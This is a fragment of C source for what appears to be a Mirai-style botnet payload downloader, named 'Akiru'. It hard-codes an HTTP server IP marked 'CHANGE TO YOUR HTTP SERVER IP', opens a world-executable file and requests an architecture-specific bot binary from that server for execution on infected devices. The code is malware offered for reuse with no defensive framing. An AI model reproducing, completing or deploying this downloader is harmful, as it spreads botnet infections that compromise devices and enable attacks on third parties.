...
#define HTTP_SERVER utils_inet_addr(107,150,25,28) // CHANGE TO YOUR HTTP SERVER IP

#define EXEC_MSG            "STIFI\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "BAE\n"
...
inline void run(void)
{
    ...
    ffd = open("Akiru", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /bins/tmp." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
